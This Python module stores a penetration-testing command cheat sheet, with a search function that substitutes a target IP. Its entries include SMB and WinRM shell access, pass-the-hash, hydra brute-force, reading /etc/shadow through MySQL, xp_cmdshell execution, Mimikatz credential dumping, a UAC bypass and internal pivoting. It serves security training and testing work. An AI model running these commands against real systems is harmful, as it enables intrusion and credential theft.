"""Static penetration testing cheat sheet & command reference manual for CYB0X-S.

Provides instant, offline command syntax lookup and standard methodology recipes with target IP substitution.
Strictly passive reference database: human decides and executes all commands.
"""

from __future__ import annotations

from typing import Any, Dict, List

REFERENCE_PLAYBOOK: List[Dict[str, Any]] = [
    # -------------------------------------------------------------------------
    # 01. NETWORKING & RECON
    # -------------------------------------------------------------------------
    {
        "category": "Networking",
        "title": "Subnet Host Discovery (ARP Scan)",
        "command": "sudo arp-scan -I eth1 <TARGET_SUBNET>",
        "desc": "Fast layer-2 MAC address sweep to find all live machines on the segment.",
        "tags": ["recon", "discovery", "arp", "network"],
    },
    {
        "category": "Networking",
        "title": "Fast Ping Sweep (fping)",
        "command": "fping -a -g <TARGET_SUBNET> 2>/dev/null",
        "desc": "ICMP echo sweep with suppressed unreachable errors.",
        "tags": ["recon", "discovery", "ping", "fping"],
    },
    {
        "category": "Networking",
        "title": "Inspect Local Network & Routing",
        "command": "ip -br a && ip route",
        "desc": "Inspect assigned IP addresses, subnets, interfaces, and default gateways.",
        "tags": ["recon", "network", "routing", "ip"],
    },
    {
        "category": "Networking",
        "title": "Full TCP Port Discovery (All Ports)",
        "command": "nmap -p- -sS -T4 <TARGET_IP>",
        "desc": "Full TCP SYN scan across all 65,535 ports.",
        "tags": ["nmap", "scan", "tcp", "ports"],
    },
    {
        "category": "Networking",
        "title": "Aggressive Service & Script Probing",
        "command": "nmap -Pn -sV -sC -O -p <PORTS> <TARGET_IP>",
        "desc": "Deep version detection, OS fingerprinting, and default scripts on open ports.",
        "tags": ["nmap", "scan", "scripts", "version"],
    },
    {
        "category": "Networking",
        "title": "UDP Top Ports Scan",
        "command": "nmap -sU --top-ports 25 --open <TARGET_IP>",
        "desc": "Fast UDP scan targeting top services (SNMP, DNS, DHCP, TFTP).",
        "tags": ["nmap", "udp", "scan"],
    },

    # -------------------------------------------------------------------------
    # 02. SMB & SAMBA
    # -------------------------------------------------------------------------
    {
        "category": "SMB",
        "title": "SMB Null Session Check",
        "command": "smbclient -L <TARGET_IP> -N",
        "desc": "Test anonymous null session to list visible shares without a password.",
        "tags": ["smb", "shares", "null", "auth"],
    },
    {
        "category": "SMB",
        "title": "SMBMap Anonymous Share Permissions",
        "command": "smbmap -u guest -p \"\" -d . -H <TARGET_IP>",
        "desc": "Enumerate read/write access permissions on all SMB shares.",
        "tags": ["smb", "smbmap", "permissions"],
    },
    {
        "category": "SMB",
        "title": "Download Specific Share File via SMBMap",
        "command": "smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\\flag.txt'",
        "desc": "Remotely download targeted files from an accessible SMB share.",
        "tags": ["smb", "smbmap", "download", "loot"],
    },
    {
        "category": "SMB",
        "title": "Interactive SMB Share Access",
        "command": "smbclient //<TARGET_IP>/<SHARE> -U '<USER>'",
        "desc": "Connect to remote share. Use 'recurse ON', 'prompt OFF', 'mget *' to download loot.",
        "tags": ["smb", "smbclient", "shares"],
    },
    {
        "category": "SMB",
        "title": "RPCClient Null Session User Enumeration",
        "command": "rpcclient -U \"\" -N <TARGET_IP> -c \"enumdomusers; enumdomgroups\"",
        "desc": "Query domain/local users and groups through an unauthenticated RPC connection.",
        "tags": ["smb", "rpc", "rpcclient", "users"],
    },
    {
        "category": "SMB",
        "title": "Comprehensive Enum4Linux Audit",
        "command": "enum4linux -a -u '<USER>' -p '<PW>' <TARGET_IP>",
        "desc": "Full automated SMB extraction: users, password policy, RID cycling, shares.",
        "tags": ["smb", "enum4linux", "audit"],
    },
    {
        "category": "SMB",
        "title": "MS17-010 EternalBlue Vulnerability Check",
        "command": "nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>",
        "desc": "Verify if Windows target is vulnerable to MS17-010 (EternalBlue RCE).",
        "tags": ["smb", "ms17-010", "eternalblue", "vuln"],
    },
    {
        "category": "SMB",
        "title": "PsExec Direct Shell Execution",
        "command": "psexec.py <USER>:'<PW>'@<TARGET_IP> cmd.exe",
        "desc": "Spawn interactive administrative cmd.exe shell over SMB using valid credentials.",
        "tags": ["smb", "psexec", "shell", "foothold"],
    },
    {
        "category": "SMB",
        "title": "Pass-the-Hash Execution via CrackMapExec",
        "command": "crackmapexec smb <TARGET_IP> -u Administrator -H '<NTLM_HASH>' -x 'whoami'",
        "desc": "Authenticate and execute remote commands using an NTLM password hash.",
        "tags": ["smb", "pth", "hashes", "crackmapexec"],
    },

    # -------------------------------------------------------------------------
    # 03. WEB & WEBDAV
    # -------------------------------------------------------------------------
    {
        "category": "Web",
        "title": "Web Tech Fingerprinting (whatweb)",
        "command": "whatweb -v http://<TARGET_IP>",
        "desc": "Identify web server, CMS, PHP version, modules, and cookies.",
        "tags": ["web", "whatweb", "fingerprint"],
    },
    {
        "category": "Web",
        "title": "Fast Directory & File Fuzzing (feroxbuster)",
        "command": "feroxbuster -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip",
        "desc": "Multi-threaded directory discovery checking extensions and hidden files.",
        "tags": ["web", "fuzzing", "feroxbuster", "dirb"],
    },
    {
        "category": "Web",
        "title": "IIS WebDAV Write Testing (davtest)",
        "command": "davtest -url http://<TARGET_IP>/webdav/ -auth <USER>:<PW>",
        "desc": "Test WebDAV permissions and verify which executable extensions can be uploaded.",
        "tags": ["web", "webdav", "iis", "davtest"],
    },
    {
        "category": "Web",
        "title": "WebDAV Interactive Shell Upload (cadaver)",
        "command": "cadaver http://<TARGET_IP>/webdav/",
        "desc": "Command-line WebDAV client for uploading ASP / PHP web shells.",
        "tags": ["web", "webdav", "cadaver", "upload"],
    },
    {
        "category": "Web",
        "title": "Shellshock Vulnerability Probe",
        "command": "nmap -sV --script=http-shellshock --script-args 'http-shellshock.uri=/gettime.cgi' -p 80 <TARGET_IP>",
        "desc": "Check CGI endpoints for Bash Shellshock environment variable execution (CVE-2014-6271).",
        "tags": ["web", "shellshock", "cgi", "vuln"],
    },
    {
        "category": "Web",
        "title": "WordPress Vulnerability Scan (wpscan)",
        "command": "wpscan --url http://<TARGET_IP>/ --enumerate u,vp,vt",
        "desc": "Enumerate WordPress users, vulnerable plugins, and vulnerable themes.",
        "tags": ["web", "wordpress", "wpscan", "cms"],
    },
    {
        "category": "Web",
        "title": "HTTP Form Brute-Force (Hydra POST)",
        "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid password'",
        "desc": "Dictionary attack on HTTP POST login form matching failure text.",
        "tags": ["web", "hydra", "brute", "login"],
    },

    # -------------------------------------------------------------------------
    # 04. DATABASES (MYSQL & MSSQL)
    # -------------------------------------------------------------------------
    {
        "category": "Databases",
        "title": "MySQL Root Login & File Read",
        "command": "mysql -h <TARGET_IP> -u root -p",
        "desc": "Connect to MySQL. Test 'select load_file(\"/etc/shadow\");' and dump user tables.",
        "tags": ["database", "mysql", "sql"],
    },
    {
        "category": "Databases",
        "title": "MySQL Dump Hashes via Nmap",
        "command": "nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=' <TARGET_IP>",
        "desc": "Extract user password hashes from remote MySQL instance.",
        "tags": ["database", "mysql", "hashes", "nmap"],
    },
    {
        "category": "Databases",
        "title": "MSSQL Remote Command Execution (xp_cmdshell)",
        "command": "nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password='',ms-sql-xp-cmdshell.cmd='type C:\\flag.txt' <TARGET_IP>",
        "desc": "Execute Windows shell commands via Microsoft SQL Server xp_cmdshell.",
        "tags": ["database", "mssql", "xp_cmdshell", "rce"],
    },
    {
        "category": "Databases",
        "title": "MSSQL Hash Dump via Nmap",
        "command": "nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password='' <TARGET_IP>",
        "desc": "Extract SQL login password hashes from master..syslogins.",
        "tags": ["database", "mssql", "hashes", "loot"],
    },

    # -------------------------------------------------------------------------
    # 05. WINDOWS EXPLOITATION & WINRM
    # -------------------------------------------------------------------------
    {
        "category": "Windows",
        "title": "WinRM Interactive Shell (evil-winrm)",
        "command": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PW>'",
        "desc": "Spawn fast interactive PowerShell session on port 5985/5986 with valid credentials.",
        "tags": ["windows", "winrm", "evil-winrm", "shell"],
    },
    {
        "category": "Windows",
        "title": "WinRM Command Execution (crackmapexec)",
        "command": "crackmapexec winrm <TARGET_IP> -u <USER> -p '<PW>' -x 'whoami && ipconfig'",
        "desc": "Verify credentials and run single command over WinRM.",
        "tags": ["windows", "winrm", "crackmapexec"],
    },
    {
        "category": "Windows",
        "title": "Remote Desktop Login (xfreerdp)",
        "command": "xfreerdp /u:<USER> /p:'<PW>' /v:<TARGET_IP> /fonts /smart-sizing",
        "desc": "Connect to graphical RDP desktop session on port 3389.",
        "tags": ["windows", "rdp", "xfreerdp", "gui"],
    },
    {
        "category": "Windows",
        "title": "BlueKeep RDP Vulnerability Check (CVE-2019-0708)",
        "command": "msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <TARGET_IP>; run'",
        "desc": "Check Windows 7 / 2008 R2 for unauthenticated BlueKeep RCE.",
        "tags": ["windows", "rdp", "bluekeep", "cve"],
    },

    # -------------------------------------------------------------------------
    # 06. WINDOWS PRIVILEGE ESCALATION & CREDENTIAL DUMPING
    # -------------------------------------------------------------------------
    {
        "category": "Windows PrivEsc",
        "title": "Inspect Privileges & Tokens",
        "command": "whoami /priv && whoami /groups",
        "desc": "Check for SeImpersonatePrivilege, SeBackupPrivilege, or administrative group membership.",
        "tags": ["windows", "privesc", "tokens", "privileges"],
    },
    {
        "category": "Windows PrivEsc",
        "title": "Mimikatz Dump Cleartext Passwords (sekurlsa)",
        "command": "privilege::debug && sekurlsa::logonPasswords",
        "desc": "Extract logged-on plaintext credentials and NTLM hashes from LSASS memory.",
        "tags": ["windows", "mimikatz", "credentials", "hashes"],
    },
    {
        "category": "Windows PrivEsc",
        "title": "Meterpreter Kiwi Credentials Dump",
        "command": "load kiwi && creds_all && lsa_dump_sam",
        "desc": "Dump SAM database hashes and LSA secrets within active Meterpreter session.",
        "tags": ["windows", "meterpreter", "kiwi", "sam"],
    },
    {
        "category": "Windows PrivEsc",
        "title": "Token Impersonation (Incognito)",
        "command": "load incognito && list_tokens -u && impersonate_token 'NT AUTHORITY\\SYSTEM'",
        "desc": "Steal delegation or impersonation token from explorer.exe or services.",
        "tags": ["windows", "meterpreter", "tokens", "incognito"],
    },
    {
        "category": "Windows PrivEsc",
        "title": "UAC Bypass via UACME (Akagi)",
        "command": "Akagi64.exe 23 C:\\Temp\\payload.exe",
        "desc": "Bypass User Account Control to run payload with elevated high-integrity token.",
        "tags": ["windows", "uac", "akagi", "privesc"],
    },

    # -------------------------------------------------------------------------
    # 07. LINUX PRIVILEGE ESCALATION
    # -------------------------------------------------------------------------
    {
        "category": "Linux PrivEsc",
        "title": "Sudo Permission Audit",
        "command": "sudo -l",
        "desc": "List commands executable with root privileges without password. Check GTFOBins.",
        "tags": ["linux", "sudo", "privesc", "gtfobins"],
    },
    {
        "category": "Linux PrivEsc",
        "title": "SUID Binary Hunting",
        "command": "find / -perm -u=s -type f 2>/dev/null",
        "desc": "Locate binaries running with root owner bit. Cross-reference with GTFOBins.",
        "tags": ["linux", "suid", "privesc"],
    },
    {
        "category": "Linux PrivEsc",
        "title": "Cron Job & Scheduled Task Recon",
        "command": "cat /etc/crontab /etc/cron.* /var/spool/cron/crontabs/* 2>/dev/null",
        "desc": "Inspect scheduled root scripts for writable paths or insecure dependencies.",
        "tags": ["linux", "cron", "privesc"],
    },
    {
        "category": "Linux PrivEsc",
        "title": "Linux Kernel & Distro Version",
        "command": "uname -a && cat /etc/*release",
        "desc": "Identify Linux kernel version and distribution for known CVE exploits.",
        "tags": ["linux", "kernel", "version"],
    },

    # -------------------------------------------------------------------------
    # 08. PIVOTING & ROUTING
    # -------------------------------------------------------------------------
    {
        "category": "Pivoting",
        "title": "Find Internal Network Interfaces",
        "command": "ip a || ifconfig || arp -a",
        "desc": "Inspect compromised machine for second NIC connecting to internal subnets.",
        "tags": ["pivoting", "interfaces", "internal"],
    },
    {
        "category": "Pivoting",
        "title": "Metasploit Autoroute Subnet Addition",
        "command": "run autoroute -s <INTERNAL_SUBNET>/24",
        "desc": "Add route to internal network through active Meterpreter session.",
        "tags": ["pivoting", "meterpreter", "autoroute"],
    },
    {
        "category": "Pivoting",
        "title": "Metasploit SOCKS5 Proxy Server",
        "command": "use auxiliary/server/socks_proxy; set SRVPORT 1080; run",
        "desc": "Start SOCKS5 proxy server to route external Kali tools via Proxychains.",
        "tags": ["pivoting", "socks", "proxychains"],
    },
    {
        "category": "Pivoting",
        "title": "Scan Internal Host via Proxychains",
        "command": "proxychains -q nmap -sT -Pn -n -p 21,22,80,445 <INTERNAL_IP>",
        "desc": "Route TCP connect scan through active SOCKS5 proxy to audit internal target.",
        "tags": ["pivoting", "proxychains", "scan"],
    },
    {
        "category": "Pivoting",
        "title": "SSH Dynamic SOCKS Proxy Tunnel",
        "command": "ssh -D 1080 -N -f user@<PIVOT_IP>",
        "desc": "Create local background SOCKS proxy on port 1080 via SSH.",
        "tags": ["pivoting", "ssh", "tunnel"],
    },

    # -------------------------------------------------------------------------
    # 09. PASSWORD CRACKING & HASHES
    # -------------------------------------------------------------------------
    {
        "category": "Cracking",
        "title": "John the Ripper (RockYou Dictionary)",
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        "desc": "Crack password hashes using standard wordlist.",
        "tags": ["cracking", "john", "passwords"],
    },
    {
        "category": "Cracking",
        "title": "Hashcat NTLM Hash Cracking (Mode 1000)",
        "command": "hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt",
        "desc": "High-speed GPU/CPU NTLM hash cracking.",
        "tags": ["cracking", "hashcat", "ntlm"],
    },
    {
        "category": "Cracking",
        "title": "Hydra SSH Brute-Force",
        "command": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh -t 4",
        "desc": "Online password dictionary attack against SSH service.",
        "tags": ["cracking", "hydra", "ssh"],
    },
]


def search_reference(query: str, target_ip: str = "") -> List[Dict[str, Any]]:
    """Search reference playbook by keyword or category.

    Substitutes <TARGET_IP> and <TARGET_SUBNET> if target_ip is provided.
    """
    q = query.strip().lower()
    results: List[Dict[str, Any]] = []

    subnet = ""
    if target_ip and "." in target_ip:
        subnet = f"{target_ip.rsplit('.', 1)[0]}.0/24"

    for entry in REFERENCE_PLAYBOOK:
        match = (
            not q
            or q in entry["title"].lower()
            or q in entry["category"].lower()
            or q in entry["desc"].lower()
            or any(q in t.lower() for t in entry["tags"])
        )
        if match:
            cmd = entry["command"]
            if target_ip:
                cmd = cmd.replace("<TARGET_IP>", target_ip)
            if subnet:
                cmd = cmd.replace("<TARGET_SUBNET>", subnet)

            results.append({
                "category": entry["category"],
                "title": entry["title"],
                "command": cmd,
                "desc": entry["desc"],
                "tags": entry["tags"],
            })

    return results
